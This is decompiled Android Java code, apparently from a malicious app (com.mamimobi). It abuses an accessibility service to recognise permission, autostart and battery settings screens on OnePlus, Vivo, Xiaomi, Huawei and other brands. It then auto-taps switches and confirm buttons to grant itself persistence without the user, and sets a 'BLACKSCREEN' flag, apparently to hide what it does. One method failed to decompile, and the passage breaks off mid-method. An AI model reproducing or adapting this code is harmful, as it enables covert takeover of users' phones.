package defpackage;

import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.work.impl.Scheduler;
import com.mamimobi.AccessService;
import io.nats.client.BaseConsumeOptions;
import io.nats.client.Options;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public abstract class la {
    public static final AtomicBoolean a = new AtomicBoolean(false);
    public static final AtomicBoolean b = new AtomicBoolean(false);
    public static final AtomicBoolean c = new AtomicBoolean(false);
    public static final AtomicBoolean d = new AtomicBoolean(false);
    public static final AtomicBoolean e = new AtomicBoolean(false);
    public static final AtomicBoolean f = new AtomicBoolean(false);
    public static final AtomicBoolean g = new AtomicBoolean(false);
    public static final AtomicBoolean h = new AtomicBoolean(false);
    public static final AtomicBoolean i = new AtomicBoolean(false);
    public static final AtomicBoolean j = new AtomicBoolean(false);
    public static final AtomicBoolean k = new AtomicBoolean(false);
    public static final AtomicBoolean l = new AtomicBoolean(false);
    public static final AtomicBoolean m = new AtomicBoolean(false);
    public static final AtomicBoolean n = new AtomicBoolean(false);
    public static final AtomicBoolean o = new AtomicBoolean(false);
    public static final AtomicBoolean p = new AtomicBoolean(false);
    public static final AtomicBoolean q = new AtomicBoolean(false);
    public static final AtomicBoolean r = new AtomicBoolean(false);
    public static final AtomicBoolean s = new AtomicBoolean(false);
    public static final AtomicBoolean t = new AtomicBoolean(false);
    public static final AtomicBoolean u = new AtomicBoolean(false);
    public static final HashMap v;

    static {
        HashMap map = new HashMap();
        v = map;
        map.put("default", "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
        map.put("legacy", "com.vivo.permissionmanager.activity.PurviewTabActivity");
        map.put("new", "com.vivo.permissionmanager.activity.PermissionSettingActivity");
    }

    public static void a() {
        List listX;
        AccessibilityNodeInfo parent;
        if (AccessService.e0.getRootInActiveWindow() != null && (listX = x("android:id/checkbox")) != null && !listX.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(0);
            if (!accessibilityNodeInfo.isChecked() && (parent = accessibilityNodeInfo.getParent()) != null) {
                g(parent.getParent());
                AccessService.e0.B();
            }
            AccessService.e0.B();
        }
        s();
    }

    public static void b() {
        AccessibilityNodeInfo parent;
        List listX = x("android:id/switch_widget");
        if (listX != null) {
            int size = listX.size();
            for (int i2 = 0; i2 < size; i2++) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get((size - 1) - i2);
                if (!accessibilityNodeInfo.isChecked() && (parent = accessibilityNodeInfo.getParent()) != null) {
                    g(parent.getParent());
                    y(100);
                    g(la0.c0(AccessService.e0, "android:id/button1"));
                }
            }
            AccessService.e0.B();
        } else {
            AccessibilityNodeInfo rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                d91.e(rootInActiveWindow, ma0.l);
            }
        }
        s();
    }

    public static void c() {
        AccessibilityNodeInfo parent;
        List listX = x("android:id/switch_widget");
        if (listX != null) {
            int size = listX.size();
            for (int i2 = 0; i2 < size; i2++) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get((size - 1) - i2);
                if (!accessibilityNodeInfo.isChecked() && (parent = accessibilityNodeInfo.getParent()) != null) {
                    g(parent.getParent());
                    y(100);
                    g(la0.c0(AccessService.e0, "android:id/button1"));
                }
            }
            AccessService.e0.B();
        }
        s();
    }

    public static void d() {
        List listX;
        AccessibilityNodeInfo parent;
        if (AccessService.e0.getRootInActiveWindow() != null && (listX = x("android:id/checkbox")) != null && !listX.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(0);
            if (!accessibilityNodeInfo.isChecked() && (parent = accessibilityNodeInfo.getParent()) != null) {
                g(parent.getParent());
                AccessService.e0.B();
            }
            AccessService.e0.B();
        }
        s();
    }

    public static void e(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo child;
        AccessibilityNodeInfo rootInActiveWindow2;
        AtomicBoolean atomicBoolean = u;
        boolean zEqualsIgnoreCase = Build.BRAND.equalsIgnoreCase("OnePlus");
        AtomicBoolean atomicBoolean2 = a;
        if (zEqualsIgnoreCase) {
            try {
                if (accessibilityEvent.getEventType() == 32 && !atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean3 = f;
                    if (atomicBoolean3.get() && accessibilityEvent.getEventType() == 32) {
                        CharSequence className = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className);
                        if ("com.android.settings.applications.InstalledAppDetailsTop".contentEquals(className)) {
                            atomicBoolean3.set(false);
                            y(1000);
                            m();
                        }
                    }
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            if (!atomicBoolean2.get()) {
                try {
                    Log.d("OnePlus", accessibilityEvent.getClassName().toString());
                    AtomicBoolean atomicBoolean4 = i;
                    if (atomicBoolean4.get() && accessibilityEvent.getEventType() == 32) {
                        CharSequence className2 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className2);
                        if ("com.oplus.powermanager.fuelgaue.PowerControlActivity".contentEquals(className2) || "com.coloros.powermanager.fuelgaue.PowerControlActivity".contentEquals(accessibilityEvent.getClassName())) {
                            atomicBoolean4.set(false);
                            y(1000);
                            b();
                        }
                    }
                } catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
        }
        if (Build.BRAND.equalsIgnoreCase("Infinix")) {
            try {
                if (accessibilityEvent.getEventType() == 32 && !atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean5 = g;
                    if (atomicBoolean5.get() && accessibilityEvent.getEventType() == 32) {
                        CharSequence className3 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className3);
                        if ("com.android.settings.applications.InstalledAppDetailsTop".contentEquals(className3)) {
                            atomicBoolean5.set(false);
                            y(1000);
                            l();
                        }
                    }
                }
            } catch (Exception e4) {
                e4.printStackTrace();
            }
            if (!atomicBoolean2.get()) {
                try {
                    AtomicBoolean atomicBoolean6 = j;
                    if (atomicBoolean6.get() && accessibilityEvent.getEventType() == 32 && (rootInActiveWindow = AccessService.e0.getRootInActiveWindow()) != null && d91.e(rootInActiveWindow, ma0.m) != null) {
                        atomicBoolean6.set(false);
                        y(1000);
                        a();
                    }
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
            }
        }
        String str = Build.BRAND;
        if ((str.equalsIgnoreCase("huawei") || str.equalsIgnoreCase("honor")) && !d.get() && !atomicBoolean2.get() && accessibilityEvent.getEventType() == 32) {
            AtomicBoolean atomicBoolean7 = c;
            if (atomicBoolean7.get()) {
                atomicBoolean7.set(false);
                y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
                h(10);
            }
        }
        if (str.equalsIgnoreCase("oppo") || str.equalsIgnoreCase("realme")) {
            try {
                if (!atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean8 = e;
                    boolean z = atomicBoolean8.get() & (accessibilityEvent.getEventType() == 32);
                    CharSequence className4 = accessibilityEvent.getClassName();
                    Objects.requireNonNull(className4);
                    if (z & "com.android.settings.applications.InstalledAppDetailsTop".contentEquals(className4)) {
                        atomicBoolean8.set(false);
                        y(1000);
                        k();
                    }
                }
            } catch (Exception unused) {
            }
            if (!atomicBoolean2.get()) {
                try {
                    AtomicBoolean atomicBoolean9 = h;
                    if (atomicBoolean9.get() && accessibilityEvent.getEventType() == 32) {
                        CharSequence className5 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className5);
                        if ("com.oplus.powermanager.fuelgaue.PowerControlActivity".contentEquals(className5) || "com.coloros.powermanager.fuelgaue.PowerControlActivity".contentEquals(accessibilityEvent.getClassName())) {
                            atomicBoolean9.set(false);
                            y(1000);
                            c();
                        }
                    }
                } catch (Exception unused2) {
                }
            }
        }
        if (Build.BRAND.equalsIgnoreCase("vivo")) {
            AtomicBoolean atomicBoolean10 = o;
            AtomicBoolean atomicBoolean11 = n;
            try {
                if (accessibilityEvent.getEventType() == 32 && !atomicBoolean2.get() && atomicBoolean11.get() && accessibilityEvent.getEventType() == 32) {
                    CharSequence className6 = accessibilityEvent.getClassName();
                    Objects.requireNonNull(className6);
                    if ("com.android.settings.applications.InstalledAppDetailsTop".contentEquals(className6)) {
                        atomicBoolean11.set(false);
                        y(1000);
                        o();
                    }
                }
            } catch (Exception e6) {
                e6.printStackTrace();
            }
            if (!atomicBoolean2.get()) {
                try {
                    if (atomicBoolean10.get() && accessibilityEvent.getEventType() == 32 && (rootInActiveWindow2 = AccessService.e0.getRootInActiveWindow()) != null && d91.e(rootInActiveWindow2, ma0.m) != null) {
                        atomicBoolean10.set(false);
                        y(1000);
                        d();
                    }
                } catch (Exception e7) {
                    e7.printStackTrace();
                }
                if (!atomicBoolean2.get() && atomicBoolean11.get() && accessibilityEvent.getEventType() == 32) {
                    try {
                        CharSequence className7 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className7);
                        String string = className7.toString();
                        if ("com.vivo.permissionmanager.activity.PurviewTabActivity".equals(string) || "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity".equals(string)) {
                            atomicBoolean11.set(false);
                            y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
                            new Thread(new ia(0)).start();
                        }
                    } catch (Exception unused3) {
                    }
                }
                if (!atomicBoolean2.get() && atomicBoolean10.get() && accessibilityEvent.getEventType() == 32) {
                    try {
                        CharSequence className8 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className8);
                        String string2 = className8.toString();
                        if ("com.iqoo.powersaving.fuelgauge.PowerRankActivity".equals(string2) || "com.iqoo.powersaving.PowerSavingManagerActivity".equals(string2)) {
                            atomicBoolean10.set(false);
                            y(Scheduler.MAX_GREEDY_SCHEDULER_LIMIT);
                            new Thread(new ia(1)).start();
                        }
                    } catch (Exception unused4) {
                    }
                }
                if (!atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean12 = q;
                    if (atomicBoolean12.get() && accessibilityEvent.getEventType() == 32) {
                        try {
                            CharSequence className9 = accessibilityEvent.getClassName();
                            Objects.requireNonNull(className9);
                            if ("com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity".equals(className9.toString())) {
                                atomicBoolean12.set(false);
                                y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
                                new Thread(new ia(2)).start();
                            }
                        } catch (Exception unused5) {
                        }
                    }
                }
                if (!atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean13 = p;
                    if (atomicBoolean13.get() && accessibilityEvent.getEventType() == 32) {
                        try {
                            CharSequence className10 = accessibilityEvent.getClassName();
                            Objects.requireNonNull(className10);
                            if ("com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity".equals(className10.toString())) {
                                atomicBoolean13.set(false);
                                new Thread(new ia(3)).start();
                            }
                        } catch (Exception unused6) {
                        }
                    }
                }
            }
        }
        String str2 = Build.BRAND;
        if (str2.equalsIgnoreCase("xiaomi") || str2.equalsIgnoreCase("mi") || str2.equalsIgnoreCase("redmi")) {
            try {
                if (!atomicBoolean2.get()) {
                    AtomicBoolean atomicBoolean14 = r;
                    if (atomicBoolean14.get() && accessibilityEvent.getEventType() == 32) {
                        CharSequence className11 = accessibilityEvent.getClassName();
                        Objects.requireNonNull(className11);
                        if ("com.miui.appmanager.ApplicationsDetailsActivity".contentEquals(className11.toString())) {
                            atomicBoolean14.set(false);
                            y(Scheduler.MAX_GREEDY_SCHEDULER_LIMIT);
                            q();
                        }
                    }
                }
            } catch (Exception unused7) {
            }
            if (atomicBoolean2.get()) {
                return;
            }
            try {
                CharSequence className12 = accessibilityEvent.getClassName();
                Objects.requireNonNull(className12);
                String string3 = className12.toString();
                if ("com.miui.powerkeeper.ui.HiddenAppsConfigActivity".contentEquals(string3)) {
                    AtomicBoolean atomicBoolean15 = s;
                    if (!atomicBoolean15.get() && accessibilityEvent.getEventType() == 32) {
                        atomicBoolean15.set(false);
                        y(800);
                        r();
                    }
                } else if ("com.miui.powercenter.legacypowerrank.PowerDetailActivity".contentEquals(string3) && !atomicBoolean.get()) {
                    r();
                }
            } catch (Exception unused8) {
            }
            if (atomicBoolean2.get()) {
                return;
            }
            try {
                CharSequence className13 = accessibilityEvent.getClassName();
                Objects.requireNonNull(className13);
                if (!"com.miui.powerkeeper.ui.HiddenAppsConfigActivity".contentEquals(className13.toString()) || accessibilityEvent.getEventType() != 32 || f11.c(AccessService.e0) || (child = AccessService.e0.getRootInActiveWindow().getChild(0)) == null) {
                    return;
                }
                child.getBoundsInScreen(new Rect());
                d91.a(AccessService.e0, (r1.left + r1.right) / 5, (int) (((r1.bottom * 3) / 13.0f) + d91.c(36.0f)));
                atomicBoolean.set(true);
                s();
            } catch (Exception unused9) {
            }
        }
    }

    public static void f() {
        int i2;
        String lowerCase = Build.BRAND.toLowerCase();
        lowerCase.getClass();
        switch (lowerCase) {
            case "oneplus":
                AtomicBoolean atomicBoolean = l;
                atomicBoolean.set(true);
                atomicBoolean.set(false);
                f.set(true);
                Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent.setData(Uri.fromParts("package", AccessService.e0.getPackageName(), null));
                intent.addFlags(268435456);
                AccessService.e0.startActivity(intent);
                break;
            case "huawei":
            case "honor":
                d.set(true);
                Intent intent2 = new Intent("android.settings.SETTINGS");
                intent2.addFlags(268435456);
                AccessService.e0.startActivity(intent2);
                y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
                v(5);
                break;
            case "realme":
            case "oppo":
                AtomicBoolean atomicBoolean2 = k;
                atomicBoolean2.set(true);
                atomicBoolean2.set(false);
                e.set(true);
                Intent intent3 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent3.setData(Uri.fromParts("package", AccessService.e0.getPackageName(), null));
                intent3.addFlags(268435456);
                AccessService.e0.startActivity(intent3);
                break;
            case "xiaomi":
            case "mi":
            case "redmi":
                r.set(true);
                Intent intent4 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent4.setData(Uri.fromParts("package", AccessService.e0.getPackageName(), null));
                intent4.addFlags(268435456);
                AccessService.e0.startActivity(intent4);
                break;
            case "vivo":
                if (AccessService.e0 != null) {
                    n.set(true);
                    if (AccessService.e0 != null) {
                        try {
                            String strT = t();
                            boolean zEquals = strT.equals("legacy");
                            HashMap map = v;
                            String str = (zEquals || (i2 = Build.VERSION.SDK_INT) < 26) ? (String) map.get("legacy") : (strT.equals("new") || i2 >= 29) ? (String) map.get("new") : (String) map.get("default");
                            try {
                                Class.forName("com.vivo.permissionmanager." + str);
                                Intent intent5 = new Intent();
                                intent5.setClassName("com.vivo.permissionmanager", str);
                                intent5.putExtra("packagename", AccessService.e0.getPackageName());
                                if (str.contains("PurviewTabActivity")) {
                                    intent5.putExtra("tabId", "1");
                                } else if (str.contains("SoftPermissionDetailActivity")) {
                                    intent5.setAction("secure.intent.action.softPermissionDetail");
                                }
                                intent5.addFlags(268435456);
                                if (intent5.resolveActivity(AccessService.e0.getPackageManager()) != null) {
                                    AccessService.e0.startActivity(intent5);
                                }
                                break;
                            } catch (ClassNotFoundException unused) {
                            }
                        } catch (Exception e2) {
                            e2.printStackTrace();
                        }
                    }
                    try {
                        Intent intent6 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                        intent6.setData(Uri.fromParts("package", AccessService.e0.getPackageName(), null));
                        intent6.addFlags(268435456);
                        AccessService.e0.startActivity(intent6);
                    } catch (Exception e3) {
                        e3.printStackTrace();
                        return;
                    }
                    break;
                }
                break;
            case "infinix":
                AtomicBoolean atomicBoolean3 = m;
                atomicBoolean3.set(true);
                atomicBoolean3.set(false);
                g.set(true);
                Intent intent7 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent7.setData(Uri.fromParts("package", AccessService.e0.getPackageName(), null));
                intent7.addFlags(268435456);
                AccessService.e0.startActivity(intent7);
                break;
            default:
                s();
                break;
        }
    }

    public static void g(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null || !accessibilityNodeInfo.isClickable()) {
            return;
        }
        accessibilityNodeInfo.performAction(16);
    }

    public static void h(int i2) {
        List listX = x("com.huawei.systemmanager:id/entry_view_layout4");
        if (listX == null || listX.size() <= 0) {
            if (i2 > 0) {
                y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
                h(i2 - 1);
                return;
            }
            return;
        }
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = ((AccessibilityNodeInfo) listX.get(0)).findAccessibilityNodeInfosByViewId("com.huawei.systemmanager:id/icon_layout");
            if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                g(listFindAccessibilityNodeInfosByViewId.get(0));
                y(250);
                n();
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        y(250);
        n();
    }

    public static void i(AccessibilityNodeInfo accessibilityNodeInfo, ru ruVar) {
        if (accessibilityNodeInfo == null || AccessService.e0 == null) {
            return;
        }
        Path path = new Path();
        accessibilityNodeInfo.getBoundsInScreen(new Rect());
        path.moveTo(r0.centerX(), r0.centerY());
        AccessService.e0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 50L)).build(), new ja(ruVar), null);
    }

    public static void j(int i2, List list, nf nfVar) {
        int[] iArr = {i2};
        int size = list.size();
        int i3 = iArr[0];
        if (i3 >= size) {
            nfVar.l();
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) list.get(i3);
        if (accessibilityNodeInfo != null) {
            if (accessibilityNodeInfo.isCheckable() && !accessibilityNodeInfo.isChecked()) {
                i(accessibilityNodeInfo, new ka(iArr, size, list, nfVar));
                return;
            }
            int i4 = iArr[0] + 1;
            iArr[0] = i4;
            j(i4, list, new p50(8, nfVar));
        }
    }

    public static void k() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        h.set(true);
        try {
            List listX = x("android:id/title");
            if (listX == null) {
                return;
            }
            if (listX.isEmpty() || (accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(2)) == null || !p(accessibilityNodeInfo.getParent().getParent())) {
                AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(AccessService.e0, la0.A);
                if (accessibilityNodeInfoD0 != null) {
                    i(accessibilityNodeInfoD0, new is(12));
                    return;
                }
                List listX2 = x("android:id/switch_widget");
                if (listX2 != null) {
                    int size = listX2.size();
                    for (int i2 = 0; i2 < size; i2++) {
                        AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) listX2.get((size - 1) - i2);
                        if (!accessibilityNodeInfo2.isChecked()) {
                            g(accessibilityNodeInfo2);
                        }
                    }
                    s();
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void l() {
        j.set(true);
        try {
            List listX = x("android:id/title");
            if (listX != null && !listX.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(5);
                if (accessibilityNodeInfo == null || !p(accessibilityNodeInfo.getParent().getParent())) {
                    AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(AccessService.e0, la0.A);
                    if (accessibilityNodeInfoD0 != null) {
                        i(accessibilityNodeInfoD0, new is(18));
                        return;
                    }
                    List listX2 = x("android:id/switch_widget");
                    if (listX2 != null) {
                        int size = listX2.size();
                        for (int i2 = 0; i2 < size; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) listX2.get((size - 1) - i2);
                            if (!accessibilityNodeInfo2.isChecked()) {
                                g(accessibilityNodeInfo2);
                            }
                        }
                        s();
                    }
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void m() {
        i.set(true);
        try {
            List listX = x("android:id/title");
            if (listX != null && !listX.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(2);
                if (accessibilityNodeInfo == null || !p(accessibilityNodeInfo.getParent().getParent())) {
                    AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(AccessService.e0, la0.A);
                    if (accessibilityNodeInfoD0 != null) {
                        i(accessibilityNodeInfoD0, new is(17));
                        return;
                    }
                    List listX2 = x("android:id/switch_widget");
                    if (listX2 != null) {
                        int size = listX2.size();
                        for (int i2 = 0; i2 < size; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) listX2.get((size - 1) - i2);
                            if (!accessibilityNodeInfo2.isChecked()) {
                                g(accessibilityNodeInfo2);
                            }
                        }
                        s();
                    }
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void n() {
        AccessibilityNodeInfo accessibilityNodeInfoC0 = la0.c0(AccessService.e0, "android:id/search_src_text");
        if (accessibilityNodeInfoC0 != null) {
            g(accessibilityNodeInfoC0);
            y(150);
            AccessibilityNodeInfo accessibilityNodeInfoC02 = la0.c0(AccessService.e0, "android:id/search_src_text");
            if (accessibilityNodeInfoC02 != null) {
                String str = AccessService.V;
                Bundle bundle = new Bundle();
                bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
                accessibilityNodeInfoC02.performAction(2097152, bundle);
                y(100);
                AccessibilityNodeInfo accessibilityNodeInfoC03 = la0.c0(AccessService.e0, "com.huawei.systemmanager:id/switcher");
                if (accessibilityNodeInfoC03 == null || !accessibilityNodeInfoC03.isChecked()) {
                    return;
                }
                g(accessibilityNodeInfoC03);
                y(99);
                List listX = x("com.huawei.systemmanager:id/switcher");
                if (listX != null) {
                    for (int i2 = 0; i2 < listX.size(); i2++) {
                        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(i2);
                        if (!accessibilityNodeInfo.isChecked()) {
                            g(accessibilityNodeInfo);
                            y(100);
                        }
                    }
                }
                g(la0.c0(AccessService.e0, "android:id/button1"));
                b.set(true);
                s();
            }
        }
    }

    public static void o() {
        o.set(true);
        try {
            List listX = x("android:id/title");
            if (listX != null && !listX.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(5);
                if (accessibilityNodeInfo == null || !p(accessibilityNodeInfo.getParent().getParent())) {
                    AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(AccessService.e0, ma0.n);
                    if (accessibilityNodeInfoD0 != null) {
                        i(accessibilityNodeInfoD0, new is(11));
                        return;
                    }
                    List listX2 = x("android:id/switch_widget");
                    if (listX2 != null) {
                        int size = listX2.size();
                        for (int i2 = 0; i2 < size; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) listX2.get((size - 1) - i2);
                            if (!accessibilityNodeInfo2.isChecked()) {
                                g(accessibilityNodeInfo2);
                            }
                        }
                        s();
                    }
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static boolean p(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null || !accessibilityNodeInfo.isClickable()) {
            return false;
        }
        return accessibilityNodeInfo.performAction(16);
    }

    /* JADX WARN: Removed duplicated region for block: B:19:0x0037  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void q() {
        /*
            java.lang.String r0 = "com.miui.securitycenter:id/am_detail_as"
            java.util.List r0 = x(r0)
            if (r0 == 0) goto L75
            int r1 = r0.size()
            if (r1 <= 0) goto L75
            r1 = 0
            java.lang.Object r0 = r0.get(r1)
            android.view.accessibility.AccessibilityNodeInfo r0 = (android.view.accessibility.AccessibilityNodeInfo) r0
            if (r0 == 0) goto L33
            int r2 = r0.getChildCount()
        L1b:
            if (r1 >= r2) goto L33
            android.view.accessibility.AccessibilityNodeInfo r3 = r0.getChild(r1)
            if (r3 == 0) goto L30
            java.lang.String r4 = r3.getViewIdResourceName()
            java.lang.String r5 = "com.miui.securitycenter:id/am_switch"
            boolean r4 = r5.equals(r4)
            if (r4 == 0) goto L30
            goto L34
        L30:
            int r1 = r1 + 1
            goto L1b
        L33:
            r3 = 0
        L34:
            if (r3 != 0) goto L37
            goto L75
        L37:
            g(r3)
            com.mamimobi.AccessService r0 = com.mamimobi.AccessService.e0
            java.lang.String r1 = "android:id/button1"
            android.view.accessibility.AccessibilityNodeInfo r0 = defpackage.la0.c0(r0, r1)
            g(r0)
            java.util.concurrent.atomic.AtomicBoolean r0 = defpackage.la.s
            r1 = 1
            r0.set(r1)
            android.content.Intent r0 = new android.content.Intent
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            java.lang.String r2 = "package:"
            r1.<init>(r2)
            com.mamimobi.AccessService r2 = com.mamimobi.AccessService.e0
            java.lang.String r2 = r2.getPackageName()
            r1.append(r2)
            java.lang.String r1 = r1.toString()
            android.net.Uri r1 = android.net.Uri.parse(r1)
            java.lang.String r2 = "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
            r0.<init>(r2, r1)
            r1 = 268435456(0x10000000, float:2.524355E-29)
            r0.addFlags(r1)
            com.mamimobi.AccessService r1 = com.mamimobi.AccessService.e0
            r1.startActivity(r0)
            return
        L75:
            java.lang.String r0 = "android:id/title"
            java.util.List r0 = x(r0)
            java.util.concurrent.atomic.AtomicBoolean r1 = defpackage.la.u
            boolean r1 = r1.get()
            if (r1 != 0) goto Lb1
            if (r0 == 0) goto Lb1
            int r1 = r0.size()
            r2 = 9
            if (r1 != r2) goto Lb1
            r1 = 2
            java.lang.Object r0 = r0.get(r1)
            android.view.accessibility.AccessibilityNodeInfo r0 = (android.view.accessibility.AccessibilityNodeInfo) r0
            android.graphics.Rect r2 = new android.graphics.Rect
            r2.<init>()
            r0.getBoundsInScreen(r2)
            int r0 = r2.left
            int r3 = r2.right
            int r0 = r0 + r3
            int r0 = r0 / r1
            int r3 = r2.bottom
            int r2 = r2.top
            int r3 = r3 + r2
            int r3 = r3 / r1
            s1 r1 = new s1
            r2 = 1
            r1.<init>(r0, r3, r2)
            defpackage.of.a(r1)
        Lb1:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.la.q():void");
    }

    public static void r() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo parent2;
        AccessibilityNodeInfo child;
        List listX = x("android:id/title");
        AtomicBoolean atomicBoolean = u;
        if (listX != null && listX.size() > 1 && (accessibilityNodeInfo2 = (AccessibilityNodeInfo) listX.get(1)) != null && (parent = accessibilityNodeInfo2.getParent()) != null && (parent2 = parent.getParent()) != null && (child = parent2.getChild(0)) != null && child.isCheckable() && !child.isChecked()) {
            g(parent2);
            atomicBoolean.set(true);
            s();
        } else {
            if (listX == null || listX.size() != 5 || (accessibilityNodeInfo = (AccessibilityNodeInfo) listX.get(1)) == null) {
                return;
            }
            accessibilityNodeInfo.getBoundsInScreen(new Rect());
            if (d91.a(AccessService.e0, (r3.left + r3.right) / 2, (r3.top + r3.bottom) / 2)) {
                AccessService.e0.B();
                AccessService.e0.B();
                atomicBoolean.set(true);
                s();
            }
        }
    }

    public static void s() {
        try {
            if (AccessService.e0 == null) {
                return;
            }
            a.set(true);
            AccessService.L0.set(true);
            fa0.R0(AccessService.e0, "PerFinishAll", true);
            fa0.R0(AccessService.e0, "BLACKSCREEN", true);
        } catch (Exception unused) {
        }
    }

    public static String t() {
        Object obj;
        try {
            for (Field field : Class.forName("android.os.Build").getDeclaredFields()) {
                if ((field.getName().toLowerCase().contains("vivo") || field.getName().toLowerCase().contains("bbk")) && (obj = field.get(null)) != null) {
                    return obj.toString();
                }
            }
            String upperCase = Build.MODEL.toUpperCase();
            return (upperCase.contains("NEX") || upperCase.contains("X") || upperCase.matches(".*[0-9]{4}.*")) ? "new" : "default";
        } catch (Exception unused) {
            return "default";
        }
    }

    public static void u(int i2) {
        AccessibilityNodeInfo accessibilityNodeInfoC0;
        AccessService accessService = AccessService.e0;
        if (accessService == null) {
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(accessService, AccessService.V);
        if (accessibilityNodeInfoD0 != null) {
            p.set(true);
            i(accessibilityNodeInfoD0, new is(14));
        } else {
            if (i2 <= 0 || (accessibilityNodeInfoC0 = la0.c0(AccessService.e0, "com.vivo.abe:id/list_view")) == null || !accessibilityNodeInfoC0.isScrollable()) {
                return;
            }
            if (accessibilityNodeInfoC0.isScrollable()) {
                accessibilityNodeInfoC0.performAction(Options.DEFAULT_MAX_CONTROL_LINE);
            }
            y(Scheduler.MAX_GREEDY_SCHEDULER_LIMIT);
            u(i2 - 1);
        }
    }

    public static void v(int i2) {
        AccessService accessService = AccessService.e0;
        if (accessService == null) {
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfoD0 = la0.d0(accessService, ma0.a);
        if (accessibilityNodeInfoD0 == null || accessibilityNodeInfoD0.getParent() == null || accessibilityNodeInfoD0.getParent().getParent() == null) {
            if (i2 <= 0) {
                w();
                return;
            }
            AccessibilityNodeInfo accessibilityNodeInfoC0 = la0.c0(AccessService.e0, "com.android.settings:id/dashboard_container");
            if (accessibilityNodeInfoC0 != null && accessibilityNodeInfoC0.isScrollable()) {
                if (accessibilityNodeInfoC0.isScrollable()) {
                    accessibilityNodeInfoC0.performAction(Options.DEFAULT_MAX_CONTROL_LINE);
                }
